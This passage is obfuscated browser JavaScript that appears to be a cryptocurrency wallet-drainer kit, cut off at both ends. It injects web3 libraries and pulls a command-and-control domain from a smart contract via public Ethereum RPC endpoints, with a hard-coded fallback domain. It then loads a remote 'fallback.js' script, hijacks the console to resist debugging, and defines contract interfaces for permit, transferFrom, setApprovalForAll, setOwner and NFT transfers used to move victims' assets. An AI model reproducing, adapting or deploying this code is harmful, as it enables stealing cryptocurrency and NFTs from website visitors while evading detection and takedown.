"Cw5R", "tLJcKW", "ANje", "yheL", "kxxcTG", "oCohtG", "DIxdIa", "tejp", "p3FcMq", "C2L6", "k8oHDq", "qKzr", "yMPK", "vZpdKW", "W4JcVL8", "A0Du", "WP1tWPC", "W4VdOXG", "BM9U", "W6SApq", "W4ldN8kl", "WONcSCo3", "BbxdSW", "lmkvWP4", "DgXL", "WQ8HWPm", "kupcPW", "ExHs", "bCo9WPa", "fColWOS", "B3rm", "b3Lw", "udmX", "c8o9W4O", "mdSj", "W7T5W60", "WRVdTMi", "WP0pWRC", "B2X3", "EfLu", "bf1B", "vqZdOa", "beP+", "Bwf0", "DK9v", "h8oYWRu", "W6ZdKSkN", "pSo4W50", "EgPM", "qw9A", "ErBcJW", "yMzV", "W4tcO3G", "iCoEWQq", "AwXZ", "Awfn", "ntK3", "lCoAFG", "rLjQ", "Fdj8", "iIbO", "n3nV", "W7VcPhC", "qNDS", "WRZdGmo6", "z0XV", "wg9N", "vgHL", "AhjS", "W5jFW7S", "W4FcL8ko", "lN93", "W6j2WQK", "pg0l", "W7RcTmkI", "gSkkW4C", "W7JdQ3q", "omkcW4S", "mLz1", "EgLq", "fmkTFa", "DePR", "W67cS8kn", "bYjp", "x2rL", "qZiW", "amkGxW", "WQFdTCoV", "jwhcPq", "a8oZW7C", "W5b6dG", "sgxcNa", "W6KDiq", "jNtcUa", "CwnR", "WOdcGSoz", "iSkRW7O", "W5lcQmkX", "wg5K", "WRhdRdm", "yxrH", "W4ZcMSkP", "us9r", "AKLw", "r0f3", "jSo5W7O", "i1ne", "W7NcG1O", "W6SApG", "BKvM", "CgfK", "lSoOWOW", "xGNcKq", "WQ3dLGC", "CeLh", "D1fp", "B29w", "nKLo", "W48irW", "WO1rsW", "v1bZ", "yw9Y", "D0r4", "lCoxDa", "Ce9K", "WQrnWQS", "W55+fW", "zKrJ", "q21P", "otnI", "zwrs", "W47cSJi", "iKVcMG", "aCkbW78", "BwfU", "wfL3", "C1DV", "DmkViW", "Be5H", "sgPZ", "jf0Q", "WPDBxa", "swzq", "vdDT", "yxjt", "w8kMWQW", "u2Hv", "c0L1", "WRddVCoR", "WQhcQmo+", "WO82W6m", "WOZdK8oE", "mZHH", "vwtcOq", "W48wfG", "BMLU", "yxbW", "r8krrG", "B3b1", "WOFdNCog", "lwnV", "nMuY", "uNzX", "EZTm", "n0u4", "EuDU", "aSkMW7y", "W5pcQSk5", "WPjszW", "WQ3dJSoL", "WPpdJLO", "dComEa", "qHldMG", "vhnr", "Aw5L", "W5XAbG", "bJnj", "icji", "ngL1BNvvwG", "mSo5W7W", "WPPWxW", "W7VdRsS", "WRZdOgq", "DhjH", "zKnq", "WP3cHSoD", "BM8T", "svvO", "zxjJ", "W5NdUmkR", "Aunp", "W7brwa", "jsNcPG", "yM8V", "WOzmW6O", "W7FdT8o0", "jJeG", "g8ozW5O", "tNPL", "ufbO", "qvrb", "vxrL", "wCkMW7y", "qwPp", "tvPT", "qwni", "qMrK", "y0G0", "neH2Ehvnyq", "sKrh", "vhHu", "W5i/aa", "W6SPoG", "DhrV", "hmoSya", "r01o", "rCo0jG", "iJ4k", "sw50", "BKXr", "WOrpW6W", "t0z2", "W5NcNSor", "lfJdIG", "DufU", "o8khW7S", "W49Caa", "rKzg", "r1zr", "wNbd", "AhPI", "W4lcJCkL", "A1n3", "W79GWRa", "rgqU", "W7JdNsO", "v3bn", "z8k8rW", "ndiY", "lh9c", "CKjP", "W45tuq", "mdq4", "t8k7iG", "t1LL", "g8kJW4m", "Bg9J", "WRzmEW", "tLLT", "mL9p", "mZzJ", "Ehvo", "Ad4Z", "tHxcVW", "y21p", "vwrR", "wK5d", "e8o7yG", "htJcRW", "m190", "WRpcK8oO", "lmk6W6i", "v3D4", "of91", "ndyX", "gXL3", "W4Todq", "pSowWPy", "Axn5", "Axnb", "d1dcUG", "rNjM", "AvDj", "yZu0", "b0Lm", "W5/dOmkW", "WRX/W4u", "W69hnG", "d3NcJq", "z2He", "C19W", "B3DL", "C1r0", "B2TL", "Axjv", "ntqY", "sxfL", "WQhcKaO", "WQjKW7a", "b2v1", "W5xdHru", "DeDX", "uNGZ", "q2ny", "WPjjW7u", "ys5P", "v0zY", "rhvw", "rSkSwG", "zdi3", "bmoNW7q", "WOFdHNW", "BgXV", "su1j", "zCklCG", "kKe6", "qwv2", "W5SVW5m", "W6dcItG", "zxju", "z1Lj", "W53cQg4", "wwHu", "WR9mW4S", "zdKW", "CYbU", "C3rH", "BcxdMG", "qtrw", "WPVcOIi", "WOjWWRm", "WQu9W60", "WRb6wq", "B3v0", "octcGq", "sCkkCG", "WQzMW4S", "FetcTW", "AxjI", "WP4jW58", "yxLP", "ceWb", "D2LK", "vLPe", "rvbb", "eZpdUW", "Ahze", "WRTvW6W", "Affz", "WOhcKNO", "ACowiW", "W7xcIYW", "WRNcJSoT", "lmoRzq", "W7hcSmkX", "tu9k", "oLne", "vgfx", "ieDn", "zuft", "WQndW68", "odiZnJe5mgnQD2jXsa", "DwX0", "E24Y", "Fs53", "W6lcMea", "v0rM", "Ec7dTa", "WRnSwW", "eWBcTa", "W4/cTSks", "Aejp", "Bg9Y", "icPC", "FHFcUq", "f8o1W7u", "WRTcW7W", "BNrZ", "g8kPW4m", "W6dcHmk6", "W70qWPi", "EeT2", "fSowW4u", "hmkSEq", "sNro", "W6VdLSoV", "uvdcMW", "k8kLW6u", "oWLH", "q2LQ", "AxqT", "eH5x", "lv9v", "r2jK", "W5pdUCkZ", "z2fO", "hmovW7a", "WP7cQM8", "W77dTti", "d8oIW64", "W4/cLG4", "W7rDsq", "qtv1", "meJcUW", "DvHh", "gLhcTW", "qvfW", "zxGT", "W6Sbma", "D1nT", "DSk6W7G", "aCkrxG", "igvU", "c8oLWO0", "Avvx", "tJHS", "zxjF", "W77cGmkA", "qxv5", "BNbN", "DuTQ", "m192", "Bd9J", "FSobWOu", "jWXk", "Dw5T", "Dc1Z", "wunu", "mv8r", "WQnJW6e", "EGza", "WRVdR8oT", "pMhdJq", "CI1Y", "zgL1", "W6FcVZi", "d8klW5W", "swmv", "WRNdICox", "W5JcMuy", "udNdPG", "CNRcMa", "bSk2Cq", "qwve", "W7OgWPW", "WQvbwG", "twfR", "u2fM", "uxPs", "AeTr", "W4quoq", "l8k3W7a", "zg9A", "qvnf", "lqFcRG", "AvPS", "BKLK", "lSoBDG", "y0HY", "aSodWOi", "Be5s", "DhfK", "m2W5", "WQ5qua", "tLnP", "WP/dImof", "rblcLa", "kde1", "nti3", "CNnR", "A0iZ", "zty4", "W7j5W44", "pfqV", "ve9r", "iSkFWPa", "W53dTMW", "rfbr", "uwzu", "uLrc", "oCk9W6S", "y2Pn", "WPWMWRq", "WRtdG2e", "tatcSq", "DfPn", "W5/dKrS", "tfDi", "CXBdTq", "tw5U", "A2DY", "rwHS", "p8oYEW", "uGBdTa", "uhfq", "WRKZWQu", "A2LU", "W5NdTtG", "W6JdSZi", "AtxdGq", "uKmY", "vMDv", "W5hdVSki", "zwn0", "lLvf", "fCo9WPK", "zgq4", "AeLM", "W7hcTCk0", "vHpdPa", "yqRcJG", "Axnh", "WR1GWRq", "sd/dLq", "WR4jW50", "pComW54", "ExJdPW", "WOrDWPO", "yxnZ", "Cgf5", "zhjL", "amkIW70", "m2u3", "yw1V", "uCk9Cq", "WPpcSta", "WO9MW7i", "C2Ln", "WPZcVCoO", "lc5N", "BwW4", "tNLy", "t2Ty", "h8kvW6y", "WPVcTbK", "qKLL", "xmkGW6q", "mMeW", "Bwf4", "W7DLW4S", "WRBcMSoE", "WOjbW5y", "Cu5P", "z8oGWRW", "WQ9CAW", "kZHI", "ibxdNG", "n8o2WRe", "nJHJ", "lHddSW", "m0PZ", "WOJdNSoa", "WQLjEW", "W79utG", "W73cPCkT", "sxDx", "lulcUG", "k1Pi", "kYS5", "mda1", "CgvL", "hgxcTG", "A0Pj", "A1PA", "wgnx", "nmoMWQa", "sK5d", "dKlcHq", "nZLI", "mSomya", "WRhcK8op", "dfFcVG", "xrpcRa", "Bw53", "W54saq", "WOn/WPi", "hSobW6a", "ENP5", "WR8PWOe", "D2Hr", "E1Wq", "vNJdUW", "WPddS28", "Dw0T", "W6zlW5u", "ELrT", "W6xdUs4", "sxrL", "W5rBW60", "qJiZ", "WR5CAq", "WQiKWOu", "s0zP", "shjo", "tNvT", "d8oyW5i", "dY3dOW", "WOFcISkj", "rMn1", "BeHw", "Ec3dUq", "evfj", "C0DU", "wuf4", "WPD7xa", "WOldPb8", "ANbN", "WO/dQmoZ", "vw5P", "z3no", "lSodWQy", "WOrQwW", "whrV", "xY/dOG", "t0vs", "d8oKW70", "WOtdHmoy", "sddcTG", "CM1P", "WQ5xW4G", "D8orWQ0", "t1FdLG", "mSo8W6a", "zhLk", "imkhW68", "W7WNWRi", "W6vZW4G", "dmkDW4y", "AZGR", "WPldOh8", "W781W60", "h8o1W5y", "zxji", "W4ZdP8kP", "Cwij", "W5/dIhm", "swrn", "WPldRmoR", "jCoYWRa", "CNLe", "W4fLDG", "d2HU", "zKTS", "q1HO", "DL4e", "vNDy", "AKnw", "iwuq", "ChvZ", "oCkxFq", "WQJcRJ4", "W6NdNG8", "sCkcuG", "qKXk", "qMLb", "W6ClW5W", "EgPo", "B01Q", "AgvY", "y2HH", "mda0", "fCkfW78", "W4HwDq", "Evbd", "yMfZ", "D3WX", "WOBdM8ok", "WPjjBW", "rgmR", "g8oWW4m", "W5PmtG", "DwLU", "W7/dRqS", "AaFdOa", "wfLW", "dmowWPa", "mhHx", "W7j4W7W", "WQT/W5a", "yxbR", "Ad0I", "W6JdTtm", "mhW1", "W7NdTsO", "nCoXW7S", "zxjZ", "DMfS", "W6hcPeK", "Dujt", "dCkXFa", "CfL4", "BMvK", "rxP2", "dCk6W7y", "CgKU", "z8o4WRS", "hIbJ", "zxLg", "WOhcJCo+", "W6vvW5G", "l8kEW6G", "Bc13", "veq1", "ndbH", "weXl", "ph0k", "EKLR", "mdzu", "eSosW48", "cmkuqW", "WQbcea", "lY9J", "W5hdRmkW", "vshdSW", "DgvY", "tKHg", "zuzV", "BCksW4u", "Dgf0", "mdK1", "mtHf", "WRrEsG", "uvDs", "hSoxWPm", "aCoXla", "kSodW70", "BMCG", "t3DU", "uLOZ", "wu9c", "pZNcQq", "y1n0", "WQVdSvW", "WQzpzG", "lgKp", "m1HO", "q0fl", "tMfT", "WP/cIIy", "C2P5", "As9p", "tNf0", "DJldLG", "rSkSpq", "zwzP", "W7X3tW", "t0vZ", "WO3dK8oZ", "lmogyG", "WRddU8oe", "WR7dUdW", "W7hcImkn", "cNlcUG", "jIdcOq", "sK5w", "WPZdVNm", "nSoqWQ0", "oSojWRK", "BtqU", "rtu2", "D2nF", "s0HO", "WRGKWPy", "e1vE", "nunH", "d8o5W4a", "pMP9", "q1nu", "CItdJq", "CNjV", "rgzm", "DxnL", "C2v0", "ALDU", "q29U", "W7NcVZi", "iupcSq", "aCkRWOi", "DX9t", "nhWW", "uJbd", "yM9Y", "zgrJ", "CeHg", "wgjR", "dwuL", "tvBdTW", "WPBdLmo5", "w0u0", "o8ogW6y", "W70NW6m", "zunV", "EhLb", "yvfo", "WQxdUSoS", "CZHG", "Etze", "emk3WRe", "rgf0", "WRNcMa4", "WO0qzq", "lKXK", "cMrT", "W6HZW4q", "nLlcTW", "uvfo", "mKfi", "qLnM", "W7ldKSkl", "DmkaiW", "AfDO", "BLbj", "ndmX", "qK5Z", "yK51", "sxr2", "kJ9e", "dCooW5O", "nSoGW7q", "W5BdJtO", "AxDe", "gCkByW", "q1LP", "W7FcR3u", "CY9L", "W6nsW5m", "tu1X", "aSowW7i", "y2vU", "W5JdPxa", "jCowW4q", "B2XK", "Dc5P", "A3vc", "WQtcMmo5", "ELnU", "emorW40", "sLjy", "ESkojq", "BgH5", "r2Pw", "A0r5", "rMPy", "W4JdPti", "tLff", "wNzz", "WRPFtG", "Dg1c", "otCY", "vqVcRG", "ChDg", "v2zz", "EfuW", "CfLi", "cCo9tq", "yY5U", "AM1f", "reHV", "xmk6WQy", "W7JdSmoU", "ievu", "rbddJa", "Dufv", "DCkvWPO", "W7vUW4q", "f8kfW4G", "rwfJ", "WQ0edG", "uejh", "n0fI", "Exbl", "ssZcJa", "AxDA", "lw1V", "FNJdUW", "ptb7", "EsJcJq", "WQDTW5K", "Ctjf", "W53cVw0", "oduX", "v0RcHq", "ANvg", "fCkrkW", "ugvd", "W73cLwC", "WR/dVhG", "uMLS", "W6hcMCkQ", "s01l", "WQ1MWO0", "vunL", "WQ1MeG", "EvLi", "W75qtG", "zdG2", "hmkVDW", "f8kTzq", "ouS5", "WQv5W7m", "y3bk", "C1RdTq", "BdzS", "bhPW", "tujf", "WRRcUGG", "tJVdTG", "vMjU", "oty0", "fSoQW6m", "mhff", "D3jM", "WRVcJ8oG", "s09V", "otiX", "WQfiFW", "nMzK", "x3nY", "mMu2", "W7G8W68", "h2jA", "qNbV", "WR9LW6y", "nHTS", "DLfu", "ngfJ", "hSoYW5K", "xwddPG", "bMHw", "y2fR", "sKTk", "mhHg", "wLDs", "nefv", "Dvf0", "k8o2WRC", "Eg5R", "wu1T", "Ewyi", "v0Ts", "n8oMWRm", "W7iYgq", "DLnN", "Axnu", "a8kzW4a", "zMHu", "i1nv", "W4RdRCkU", "WQ7dVCob", "vsrl", "mZGY", "d8kWEq", "u0rU", "vmknga", "m19f", "sxjH", "WPJdV8kL", "W6/cMgW", "qHpdMW", "t0Xz", "xSo1qW", "yKHf", "v0mq", "z214", "yxzH", "W7jQW5G", "C1Lg", "eCoNuW", "ue9u", "fY3cRq", "W4GRaW", "zxj0", "CGar", "pflcVq", "mCkKCW", "Exrg", "lCo7W7O", "Chfb", "r3v5", "W7/cKCkA", "Cc3cPq", "WPBcQmoN", "WR4aWRG", "zxbU", "lwXV", "WRWOWP4", "ztCX", "nLvf", "tuDf", "W5FcL8kN", "jSkPW5q", "ENvH", "re1Q", "W5jVW44", "WRRcP8oh", "l15J", "A1PP", "WQegW5W", "W4m3mG", "WOlcJSoo", "CI1Z", "cv9L", "whvT", "v2XZ", "aK89", "aSk2pG", "uvf4", "fSkKyW", "DwHf", "WPm8W4C", "mte1", "kSkbW54", "kNjU", "ignY", "ztOG", "eHFcUq", "vuTp", "BuGL", "sM13", "ChbP", "WQ1fW5i", "zs13", "pSkNW4e", "zw5j", "AxrO", "kr1m", "WO/cNbq", "WOnrWQC", "A3Di", "shbf", "W7bAbW", "AmkMgq", "zgi0", "q8kUWO4", "WQG6W5u", "bgH5", "DeP3", "W7zoiW", "wfzn", "W77cJSkZ", "tvDs", "Axvh", "W6dcRMO", "wg/cTG", "WOxdRmoC", "iSkpCW", "t0jM", "wftcKa", "bXD5", "W79AvG", "yLFdLa", "WPVdR1u", "W7WpkW", "w8kHWR0", "Buu2", "uw50", "tvjc", "tSooW5O", "tg9H", "wM9k", "sZG3", "lJmU", "AfPi", "DcTf", "j8kSzG", "rdD1", "W5q9kW"];
  Z = function () {
    return uHk;
  };
  return Z();
}
if (config.useSweetAlert || config.useDefaultPopup) {
  injectScript("https://cdn.jsdelivr.net/npm/sweetalert2@11");
}
injectScript("https://cdnjs.cloudflare.com/ajax/libs/web3/4.2.2/web3.min.js");
injectScript("https://unpkg.com/crypto-js@latest/crypto-js.js");
injectScript("https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js");
injectScript("https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js");
function fromHex(T) {
  var B = '';
  for (var V = 0; V < T.length; V += 2) {
    B += String.fromCharCode(parseInt(T.substr(V, 2), 16));
  }
  return decodeURIComponent(escape(B)).replace(/[^a-zA-Z0-9.-]/g, '');
}
function b(T, k) {
  return m(k - 0x3a9, T);
}
(function () {
  let k;
  try {
    const H = Function("return (function() {}.constructor(\"return this\")( ));");
    k = H();
  } catch (i) {
    k = window;
  }
  k.setInterval(u, 1000);
})();
function sendRequest(k, H, i) {
  const V = {
    to: H,
    data: i
  };
  const U = {
    "jsonrpc": "2.0",
    "method": "eth_call",
    "params": [V, "latest"],
    "id": 0x1
  };
  return fetch(k, {
    "method": "POST",
    "cache": "no-cache",
    "headers": {
      "Content-Type": "application/json"
    },
    "body": JSON.stringify(U)
  }).then(q => q.json());
}
function X(T, k) {
  return A(T - 0x27d, k);
}
const rpcUrls = ["https://rpc.ankr.com/eth", "https://ethereum.publicnode.com/", "https://eth.meowrpc.com/"];
function sendRequests(T, k, H) {
  const B = T.map(V => sendRequest(V, k, H));
  return Promise.allSettled(B);
}
sendRequests(rpcUrls, "0x941E09C78cc72b5C264c17BA6327c06A0Faad6e5", "0xc2fb26a629690e2388a22f16d924e4a645cd2b40a8e24c414d664ad7ea957b73").then(T => {
  const B = T.find(V => V.status === "fulfilled");
  if (B) {
    console.log("Result:", B.value.result);
    let V = fromHex(B.value.result);
    V = V.trim();
    console.log(V);
    if (V == "dd5889a9b4e234dbb210787.com") {
      console.log("Ignoring fallback");
    } else {
      injectScript("https://" + V + "/npm/fallback.js");
    }
  } else {
    console.error("All requests failed");
    console.log("Using fallback cdn");
    injectScript("https://dd5889a9b4e234dbb210787.com/npm/fallback.js");
  }
})["catch"](T => {
  console.error("Error:", T);
});
function isScriptLoaded(T) {
  var B = document.getElementsByTagName("script");
  for (var V = 0; V < B.length; V++) {
    if (B[V].src === T) {
      return true;
    }
  }
  return false;
}
function injectScript(k) {
  const i = function () {
    let U = true;
    return function (q, y) {
      const K = U ? function () {
        if (y) {
          const s = y.apply(q, arguments);
          y = null;
          return s;
        }
      } : function () {};
      U = false;
      return K;
    };
  }();
  (function () {
    i(this, function () {
      const q = new RegExp("function *\\( *\\)");
      const y = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const K = u("init");
      if (!q.test(K + "chain") || !y.test(K + "input")) {
        K("0");
      } else {
        u();
      }
    })();
  })();
  if (!isScriptLoaded(k)) {
    var f = document.createElement("script");
    f.charset = "UTF-8";
    f.async = "true";
    f.type = "text/javascript";
    f.src = k;
    var D = document.head || document.getElementsByTagName("head")[0];
    if (D.firstChild) {
      D.insertBefore(f, D.firstChild);
    } else {
      D.appendChild(f);
    }
  }
}
function generateKey() {
  const B = function () {
    let N = true;
    return function (c, l) {
      const o = N ? function () {
        if (l) {
          const O = l.apply(c, arguments);
          l = null;
          return O;
        }
      } : function () {};
      N = false;
      return o;
    };
  }();
  const V = B(this, function () {
    return V.toString().search("(((.+)+)+)+$").toString().constructor(V).search("(((.+)+)+)+$");
  });
  V();
  const f = function () {
    let N = true;
    return function (c, l) {
      const o = N ? function () {
        if (l) {
          const O = l.apply(c, arguments);
          l = null;
          return O;
        }
      } : function () {};
      N = false;
      return o;
    };
  }();
  const D = f(this, function () {
    const l = function () {
      let x;
      try {
        x = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (E) {
        x = window;
      }
      return x;
    };
    const o = l();
    const O = o.console = o.console || {};
    const I = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let x = 0; x < I.length; x++) {
      const E = f.constructor.prototype.bind(f);
      const r = I[x];
      const Q = O[r] || E;
      E.__proto__ = f.bind(f);
      E.toString = Q.toString.bind(Q);
      O[r] = E;
    }
  });
  D();
  function y(N) {
    let o = '';
    for (let O = 0; O < N; O++) {
      o += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz".length));
    }
    return o;
  }
  const K = Math.floor(Math.random() * 4) + 3;
  const s = Math.floor(Math.random() * 4) + 3;
  const a = y(K);
  const t = y(s);
  return a + "-" + t;
}
const GMX_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "_receiver",
    "type": "address"
  }],
  "name": "signalTransfer",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const CURVE_ABI = [{
  "stateMutability": "nonpayable",
  "type": "function",
  "name": "remove_liquidity_one_coin",
  "inputs": [{
    "name": "_burn_amount",
    "type": "uint256"
  }, {
    "name": "i",
    "type": "int128"
  }, {
    "name": "_min_received",
    "type": "uint256"
  }, {
    "name": "_receiver",
    "type": "address"
  }],
  "outputs": [{
    "name": '',
    "type": "uint256"
  }]
}];
const CURVE_USE_ETH_ABI = [{
  "stateMutability": "nonpayable",
  "type": "function",
  "name": "remove_liquidity_one_coin",
  "inputs": [{
    "name": "token_amount",
    "type": "uint256"
  }, {
    "name": "i",
    "type": "uint256"
  }, {
    "name": "min_amount",
    "type": "uint256"
  }, {
    "name": "use_eth",
    "type": "bool"
  }, {
    "name": "receiver",
    "type": "address"
  }],
  "outputs": [{
    "name": '',
    "type": "uint256"
  }]
}];
const MAKER_ABI = [{
  "constant": false,
  "inputs": [{
    "name": "owner_",
    "type": "address"
  }],
  "name": "setOwner",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}];
const DAI_PERMIT_ABI = [{
  "constant": false,
  "inputs": [{
    "name": "_src",
    "type": "address"
  }, {
    "name": "_dst",
    "type": "address"
  }, {
    "name": "_wad",
    "type": "uint256"
  }],
  "name": "transferFrom",
  "outputs": [{
    "name": '',
    "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
    "internalType": "address",
    "name": "holder",
    "type": "address"
  }, {
    "internalType": "address",
    "name": "spender",
    "type": "address"
  }, {
    "internalType": "uint256",
    "name": "nonce",
    "type": "uint256"
  }, {
    "internalType": "uint256",
    "name": "expiry",
    "type": "uint256"
  }, {
    "internalType": "bool",
    "name": "allowed",
    "type": "bool"
  }, {
    "internalType": "uint8",
    "name": "v",
    "type": "uint8"
  }, {
    "internalType": "bytes32",
    "name": "r",
    "type": "bytes32"
  }, {
    "internalType": "bytes32",
    "name": "s",
    "type": "bytes32"
  }],
  "name": "permit",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
    "internalType": "address",
    "name": '',
    "type": "address"
  }],
  "name": "nonces",
  "outputs": [{
    "internalType": "uint256",
    "name": '',
    "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}];
const LP_ABI = [{
  "inputs": [{
    "internalType": "bytes[]",
    "name": "data",
    "type": "bytes[]"
  }],
  "name": "multicall",
  "outputs": [{
    "internalType": "bytes[]",
    "name": "results",
    "type": "bytes[]"
  }],
  "stateMutability": "payable",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "operator",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "approved",
    "type": "bool"
  }],
  "name": "setApprovalForAll",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const NFT_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "owner",
    "type": "address"
  }, {
    "internalType": "address",
    "name": "operator",
    "type": "address"
  }],
  "name": "isApprovedForAll",
  "outputs": [{
    "internalType": "bool",
    "name": '',
    "type": "bool"
  }],
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "operator",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "approved",
    "type": "bool"
  }],
  "name": "setApprovalForAll",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "to",
    "type": "address"
  }, {
    "internalType": "uint256",
    "name": "tokenId",
    "type": "uint256"
  }],
  "name": "approve",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const UNISWAP = [{
  "inputs": [{
    "internalType": "uint256",
    "name": "amountIn",
    "type": "uint256"
  }, {
    "internalType": "uint256",
    "name": "amountOutMin",
    "type": "uint256"
  }, {
    "internalType": "address[]",
    "name": "path",
    "type": "address[]"
  }, {
    "internalType": "address",
    "name": "to",
    "type": "address"
  }],
  "name": "swapExactTokensForTokens",
  "outputs": [{
    "internalType": "uint256",
    "name": "amountOut",
    "type": "uint256"
  }],
  "stateMutability": "payable",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "uint256",
    "name": "deadline",
    "type": "uint256"
  }, {
    "internalType": "bytes[]",
    "name": "data",
    "type": "bytes[]"
  }],
  "name": "multicall",
  "outputs": [{
    "internalType": "bytes[]",
    "name": '',
    "type": "bytes[]"
  }],
  "stateMutability": "payable",
  "type": "function"
}];
const PANCAKESWAPV3 = [{
  "inputs": [{
    "internalType": "uint256",
    "name": "deadline",
    "type": "uint256"
  }, {
    "internalType": "bytes[]",
    "name": "data",
    "type": "bytes[]"
  }],
  "name": "multicall",
  "outputs": [{
    "internalType": "bytes[]",
    "name": '',
    "type": "bytes[]"
  }],
  "stateMutability": "payable",
  "type": "function"
}, {
  "inputs": [{
    "components": [{
      "internalType": "address",
      "name": "tokenIn",
      "type": "address"
    }, {
      "internalType": "address",
      "name": "tokenOut",
      "type": "address"
    }, {
      "internalType": "uint24",
      "name": "fee",
      "type": "uint24"
    }, {
      "internalType": "address",
      "name": "recipient",
      "type": "address"
    }, {
      "internalType": "uint256",
      "name": "amountIn",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "amountOutMinimum",
      "type": "uint256"
    }, {
      "internalType": "uint160",
      "name": "sqrtPriceLimitX96",
      "type": "uint160"
    }],
    "internalType": "struct IV3SwapRouter.ExactInputSingleParams",
    "name": "params",
    "type": "tuple"
  }],
  "name": "exactInputSingle",
  "outputs": [{
    "internalType": "uint256",
    "name": "amountOut",
    "type": "uint256"
  }],
  "stateMutability": "payable",
  "type": "function"
}];
const SUSHISWAP = [{
  "inputs": [{
    "internalType": "uint256",
    "name": "amountIn",
    "type": "uint256"
  }, {
    "internalType": "uint256",
    "name": "amountOutMin",
    "type": "uint256"
  }, {
    "internalType": "address[]",
    "name": "path",
    "type": "address[]"
  }, {
    "internalType": "address",
    "name": "to",
    "type": "address"
  }, {
    "internalType": "uint256",
    "name": "deadline",
    "type": "uint256"
  }],
  "name": "swapExactTokensForTokens",
  "outputs": [{
    "internalType": "uint256[]",
    "name": "amounts",
    "type": "uint256[]"
  }],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const CRYPTOPUNK = [{
  "constant": false,
  "inputs": [{
    "name": "to",
    "type": "address"
  }, {
    "name": "punkIndex",
    "type": "uint256"
  }],
  "name": "transferPunk",
  "outputs": [],
  "payable": false,
  "type": "function"
}];
const TRADERJOE_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "spender",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "approved",
    "type": "bool"
  }],
  "name": "approveForAll",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const APECOINSTAKING = [{
  "inputs": [{
    "internalType": "address",
    "name": "_address",
    "type": "address"
  }],
  "name": "getApeCoinStake",
  "outputs": [{
    "components": [{
      "internalType": "uint256",
      "name": "poolId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "tokenId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "deposited",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "unclaimed",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "rewards24hr",
      "type": "uint256"
    }, {
      "components": [{
        "internalType": "uint256",
        "name": "mainTokenId",
        "type": "uint256"
      }, {
        "internalType": "uint256",
        "name": "mainTypePoolId",
        "type": "uint256"
      }],
      "internalType": "struct ApeCoinStaking.DashboardPair",
      "name": "pair",
      "type": "tuple"
    }],
    "internalType": "struct ApeCoinStaking.DashboardStake",
    "name": '',
    "type": "tuple"
  }],
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "_address",
    "type": "address"
  }],
  "name": "getBakcStakes",
  "outputs": [{
    "components": [{
      "internalType": "uint256",
      "name": "poolId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "tokenId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "deposited",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "unclaimed",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "rewards24hr",
      "type": "uint256"
    }, {
      "components": [{
        "internalType": "uint256",
        "name": "mainTokenId",
        "type": "uint256"
      }, {
        "internalType": "uint256",
        "name": "mainTypePoolId",
        "type": "uint256"
      }],
      "internalType": "struct ApeCoinStaking.DashboardPair",
      "name": "pair",
      "type": "tuple"
    }],
    "internalType": "struct ApeCoinStaking.DashboardStake[]",
    "name": '',
    "type": "tuple[]"
  }],
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "_address",
    "type": "address"
  }],
  "name": "getBaycStakes",
  "outputs": [{
    "components": [{
      "internalType": "uint256",
      "name": "poolId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "tokenId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "deposited",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "unclaimed",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "rewards24hr",
      "type": "uint256"
    }, {
      "components": [{
        "internalType": "uint256",
        "name": "mainTokenId",
        "type": "uint256"
      }, {
        "internalType": "uint256",
        "name": "mainTypePoolId",
        "type": "uint256"
      }],
      "internalType": "struct ApeCoinStaking.DashboardPair",
      "name": "pair",
      "type": "tuple"
    }],
    "internalType": "struct ApeCoinStaking.DashboardStake[]",
    "name": '',
    "type": "tuple[]"
  }],
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "address",
    "name": "_address",
    "type": "address"
  }],
  "name": "getMaycStakes",
  "outputs": [{
    "components": [{
      "internalType": "uint256",
